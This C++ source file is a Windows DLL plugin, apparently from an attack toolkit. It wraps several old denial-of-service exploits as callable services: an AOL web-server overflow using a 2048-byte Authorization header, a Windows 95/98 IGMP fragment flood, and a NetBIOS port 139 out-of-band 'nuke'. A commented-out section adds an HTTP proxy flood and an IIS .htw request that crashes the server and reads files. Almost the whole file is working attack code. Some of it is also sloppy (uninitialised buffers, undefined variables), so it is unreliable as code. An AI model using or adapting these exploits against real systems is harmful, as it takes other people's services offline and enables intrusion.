//---------------------------------------------------------------------------

#include <vcl.h>
//#include <windows.h>
//---------------------------------------------------------------------------
//   Important note about DLL memory management when your DLL uses the
//   static version of the RunTime Library:
//
//   If your DLL exports any functions that pass String objects (or structs/
//   classes containing nested Strings) as parameter or function results,
//   you will need to add the library MEMMGR.LIB to both the DLL project and
//   any other projects that use the DLL.  You will also need to use MEMMGR.LIB
//   if any other projects which use the DLL will be performing new or delete
//   operations on any non-TObject-derived classes which are exported from the
//   DLL. Adding MEMMGR.LIB to your project will change the DLL and its calling
//   EXE's to use the BORLNDMM.DLL as their memory manager.  In these cases,
//   the file BORLNDMM.DLL should be deployed along with your DLL.
//
//   To avoid using BORLNDMM.DLL, pass string information using "char *" or
//   ShortString parameters.
//
//   If your DLL uses the dynamic version of the RTL, you do not need to
//   explicitly add MEMMGR.LIB as this will be done implicitly for you
//---------------------------------------------------------------------------
#define BUILD_DLL       //Added

#include <winsock2.h>

#include "STBonus.h"
#pragma hdtstop         //Added
#pragma argsused

using namespace std;


int WINAPI DllEntryPoint(HINSTANCE hinst, unsigned long reason, void* lpReserved)
{
    switch (reason)
    {
        case DLL_PROCESS_ATTACH:
            // Code to run when the DLL is loaded
            break;

        case DLL_PROCESS_DETACH:
            // Code to run when the DLL is freed
            break;

        case DLL_THREAD_ATTACH:
            // Code to run when a thread is created during the DLL's lifetime
            break;

        case DLL_THREAD_DETACH:
            // Code to run when a thread ends normally.
            break;
    }
    return TRUE;
}

extern "C" HRESULT __declspec(dllexport) WINAPI DllGetVersion(dllversioninfo* Release)
        {
        Release->dwmajorversion = 1;
        Release->dwminorversion = 0;
        Release->dwbuildnumber = 10;

        return 1;
        }

extern "C" AnsiString __declspec(dllexport) WINAPI EnumServices(int ServiceID)
{
switch (ServiceID)
        {
        case 0: return "AOL Attack";
        case 1: return "Windows 95 / 98 IGMP Fragment DoS";
        case 2: return "DOS Nuke";
       default: return "";
        };
 }

extern "C" AnsiString __declspec(dllexport) WINAPI GetServiceDesc(int ServiceID)
{
switch (ServiceID)
        {
        case 0: return "Overflood after 'GET / HTTP/1.0\nAuthorization: Basic '";
        case 1: return "IGMP Fragment DoS";
        case 2: return "DOS Nuke";
       default: return "";
        };
 }

extern "C" int __declspec(dllexport) WINAPI GetServicePort(int ServiceID)
{
switch (ServiceID)
        {
        case 0: return 80;
        case 1: return 0;
        case 2: return 139;
       default: return 0;
        };
 }

extern "C" bool __declspec(dllexport) WINAPI CallService(int ServiceID, AnsiString ip, int port, int proto, TMemo* Report)
{
        WSADATA                 wsad;
	struct sockaddr_in	dest;
	struct hostent		*hp;
	unsigned int		addr=0;

        if( WSAStartup( 0x0101, &wsad ) )          //  Initialize sockets here
                {
                Report->Lines->Add("ERROR|\tWSAStartup(0x0101) failed:" + AnsiString(WSAGetLastError()));
                return false;
                };

	memset(&dest,0,sizeof(dest));
	hp = gethostbyname( ( char *) ip.c_str());
	if (!hp)
		addr = inet_addr(ip.c_str());

	if ((!hp)  && (addr == INADDR_NONE) )
        	{
                Report->Lines->Add("ERROR|\tUnable to resolve " + ip);
                WSACleanup();
		return false;
        	};

	if (hp != NULL)
                memcpy(&(dest.sin_addr),hp->h_addr,hp->h_length);
	else
  		dest.sin_addr.s_addr = addr;

	if (hp)
		dest.sin_family = hp->h_addrtype;
	else
		dest.sin_family = AF_INET;

        if (port)
                dest.sin_port = (short)port;                  // load target port

switch (ServiceID)
        {
        case 0: return AOLCrash(dest, proto, Report);
        case 1: return IGMPWinDOS(dest, proto, Report);
        case 2: return DOSNuke(dest, proto, Report);
       default: return false;
        };
 }

//#include <stdio.h>
//#include <stdlib.h>


bool AOLCrash(struct sockaddr_in &target, int proto, TMemo* Report)
 {
	int sockfd, i;
	char str[2098];
	struct hostent *he;
	struct sockaddr_in their_addr;

        Report->Lines->Add("aolcrash.c by external [X]");
        Report->Lines->Add("\\__updated by Alessandro Polo 2002");

	strcpy(str, "GET / HTTP/1.0\nAuthorization: Basic ");
	for(i=0; i<2048; i++)
		strcat(str, "X");
	strcat(str, "\r\n\r\n");

	target.sin_family = AF_INET;
	target.sin_port = htons(80);

//	bzero(&their_addr.sin_zero, 8);
	if ((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                Report->Lines->Add("ERROR|\tUnable to create socket.");
                WSACleanup();
		return false;
	}
	if(connect(sockfd, (struct sockaddr *)&target, sizeof(struct sockaddr)) == -1) {
                Report->Lines->Add("ERROR|\tUnable to connect.");
                WSACleanup();
		return false;
	}
	if(send(sockfd, str, 2098, 0) == -1) {
                Report->Lines->Add("ERROR|\tUnable to send data.");
                WSACleanup();
		return false;
	}
        Report->Lines->Add("Exploit's String Sent.");
	closesocket(sockfd);
        return true;
 };


bool IGMPWinDOS (struct sockaddr_in &target, int proto, TMemo* Report)
 {
	int sockfd, explode, times, x;
	char			big[20000];
	explode = 1;
	times = 2;

        Report->Lines->Add("Windows 95 / 98 IGMP Fragment DoS by Michael Stevens");
        Report->Lines->Add("\\__updated by Alessandro Polo 2002");


	if ((sockfd = socket(AF_INET, SOCK_RAW, 2)) == -1) {
                Report->Lines->Add("ERROR|\tCould not allocate socket.");
                WSACleanup();
		return false;
	}

	if ( (connect(sockfd, (struct sockaddr *)&target, sizeof (struct sockaddr) )) == -1) {
                Report->Lines->Add("ERROR|\tCouldn't connect to host.");
                WSACleanup();
		return false;
	}

	if ( send(sockfd, big, explode, 0) == -1) {
                Report->Lines->Add("ERROR|\tError sending check size (lower).");
                WSACleanup();
		return false;
	}

	for (x = 0; x <= times; x++)
	{
//		usleep(100000);
		if (send(sockfd, big, explode, 0) == -1) {
                        Report->Lines->Add("ERROR|\tError sending.");
                        WSACleanup();
		        return false;
		}
                Report->Lines->Add("Sent " + AnsiString(x) + "packets.");
	}
     Report->Lines->Add("Exploit's String Sent.");
     closesocket(sockfd);
     WSACleanup();
     return true;
 };


bool DOSNuke (struct sockaddr_in &target, int proto, TMemo* Report)
{
   int i, errcode;
   char *tempbuf;
   SOCKET theSocket;
   sockaddr theAddr;

   /* allocate a socket */
   theSocket= socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);
   if (theSocket==-1){
        Report->Lines->Add("ERROR|\tCan't create the socket.");
        WSACleanup();
        return false;
   }

   /* Set default values */                     // MUST BE PARAM
   int NumOfAttact = 10;
   int BufSize = 1024;

   /* establish TCP connection...*/
   theAddr.sa_family = AF_INET;

   Report->Lines->Add("Establish connection");
   errcode = connect (theSocket, (struct sockaddr *)&target, sizeof(sockaddr));
   if (errcode){
        Report->Lines->Add("ERROR|\tError connecting target.");
        WSACleanup();
        return false;
   }

   Report->Lines->Add("STATUS:\TConnected!!");

   /* prepare data to send out...*/
   tempbuf = (char*) malloc(BufSize);
   for (i=0; i<BufSize; i++) tempbuf[i]=0;

   /* nuking...*/
   for (i=0; i<NumOfAttact; i++){
    	errcode = send (theSocket, tempbuf, BufSize, MSG_OOB);
        if (errcode==-1)
                Report->Lines->Add("Attact ID: " + AnsiString(i) + " FALIED");
        else
                Report->Lines->Add("Attact ID: " + AnsiString(i) + " Sent " + errcode + " bytes");
   }

   /* free up everything */
   free (tempbuf);
   closesocket (theSocket);
   WSACleanup();
   return true;
 };




///////////////////////////////////
int CheckWinsock(){
   WORD wVersionRequested;
   WSADATA wsaData;
   int err;
   wVersionRequested = MAKEWORD(1, 1);
   err = WSAStartup(wVersionRequested, &wsaData);
   if (err != 0) return err;
   if ( LOBYTE( wsaData.wVersion ) != 1 ||
        HIBYTE( wsaData.wVersion ) != 1 ) {
		WSACleanup(); return -1;
   } return 0;
}

//////////////////////////////////////////////////////////////////// TESTING

/*

==> GENOCIDE

bool ProxyDOS (struct sockaddr_in &target, int proto, TMemo* Report)
{
   int fd;
   struct sockaddr_in box;

   Report->Lines->Add("Many http proxies DoS (c) sectorx of xor");
   Report->Lines->Add("\\__updated by Alessandro Polo 2002");

   if (argc < 3) {
      fprintf(stderr, "usage: %s <your ip> <proxy ip> [proxy port]\n",argv[0]);
      return;
   }

   Report->Lines->Add("\tMaking a stall on port 80 ... ");
   fd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
   if (fd<0) {
      perror("socket() ");
      return;
   }

   target.sin_port = htons(0x50);
   if (bind(fd,(struct sockaddr*)&target,sizeof(struct sockaddr))<0) {
      perror("bind()[80] ");
      return;
   }
   if (listen(fd,65535)<0) {
      perror("listen() ");
      return;
   }
   Report->Lines->Add("\tDone!");
   Report->Lines->Add("\tAttacking proxy : ");
   for (;;) {
      int sock;
      
      sock = Connect(inet_addr(argv[2]),(argc>3)?(atoi(argv[3])):3128);
      if (sock<0) {
	 perror("Connect() ");
	 sleep(15);
	 continue;
      }
      sprint(sock,"GET http://%s/ HTTP/1.0\n\n",argv[1]);
      fprintf(stderr, ".");
   }
 };

==>> iisdos_c.txt


int openhost(char *host,int port) {
  int sock;
  struct sockaddr_in addr;
  struct hostent *he;

  he=gethostbyname(host);

  if (he==NULL) {
    perror("gethostbyname()");
    exit(-1); }

  sock=socket(AF_INET, SOCK_STREAM, getprotobyname("tcp")->p_proto);

  if (sock==-1) {
    perror("socket()");
    exit(-1); }

  memcpy(&addr.sin_addr, he->h_addr, he->h_length);
  addr.sin_family=AF_INET;
  addr.sin_port=htons(port);

  if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
    sock=-2; } 

  return sock;
}

void sends(int sock,char *buf) {
  write(sock,buf,strlen(buf));
}

void IISDoS (struct sockaddr_in &target, int proto, TMemo* Report)
                //(char *host, int port)
{
//  Sintaxe: %s <host> [port - default 80]\n",argv[0])
    Report->Lines->Add("DoS against IIS and Win2000.0 Servers by wildcoyote");
    Report->Lines->Add("\\__updated by Alessandro Polo 2002");

 int sock,i,file_buf_size;
 char *buf, file_read[256],valid_file[256];
 printf("File to read: ");
 scanf("%s",&file_read);
 scanf("%s",&valid_file);
 file_buf_size=strlen(valid_file);
 Report->Lines->Add("\tTrying to connect");     //printf("Trying to connect to %s (%d)....(please wait)\n",host,port);
 sock=openhost(host,port);
 if(sock<=0) {
     Report->Lines->Add("\t- Could not connect -");

 }
 else Report->Lines->Add("\tConnected."); //printf("Connected to %s (%d)\n",host,port);
 Report->Lines->Add("\tAllocating memory for DoS");
 buf = (char *) malloc(2500); // bah! =) whatever...
 sprintf(buf,"GET %s",valid_file);
 for(i=0;i<file_buf_size;i++) strcat(buf,"%20");
 strcat(buf,".htw?CiWebHitsFile=");
 strcat(buf,file_read);
 strcat(buf,"&CiRestriction=none&CiHiliteType=Full HTTP/1.0\n\n");
 Report->Lines->Add("\tOk! Sending CRASH!");
 sends(sock,buf);
 close(sock);
 free(buf);
 Report->Lines->Add("\tCrash sent! The host *probably* crashed :P");
};

*/
